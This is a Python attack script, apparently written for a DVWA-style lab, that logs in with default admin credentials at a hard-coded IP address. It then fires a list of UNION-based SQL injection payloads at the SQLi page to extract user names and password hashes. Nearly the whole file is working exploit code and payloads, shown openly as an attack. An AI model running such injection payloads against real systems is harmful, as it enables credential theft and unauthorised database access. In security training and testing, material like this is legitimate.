
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

# Since the query is: SELECT first_name, last_name FROM users WHERE user_id = '$id'
# And the output displays: ID: $id, First name: first_name, Surname: last_name
# I can inject: 1' UNION SELECT user_name, user_password FROM users WHERE '1'='1
# OR use CONCAT to get multiple columns in the two output fields

print("[*] Attempting to extract username and password using SQLi...\n")

# First try: Get user_name in first_name column and user_password in last_name column
sqli_payloads = [
    "999999' UNION SELECT user_name, user_password FROM users WHERE '1'='1",
    "999' UNION SELECT user_name, user_password FROM users WHERE '1'='1",
    "-1' UNION SELECT user_name, user_password FROM users WHERE '1'='1",
    "0' UNION SELECT user_name, user_password FROM users #",
]

for payload in sqli_payloads:
    print(f"[*] Trying: {payload}\n")
    response = session.get(sqli_url, params={"id": payload, "Submit": "Submit"}, verify=False)
    
    # Extract the pre section
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        print(f"    Result:\n{result_text}\n")
        
        # Check if we got actual user data (not just from the regular query)
        if result_text.count("<br />") > 3:  # More than just ID, First name, Surname
            print(f"[+] Found multiple results! Extracting data...\n")

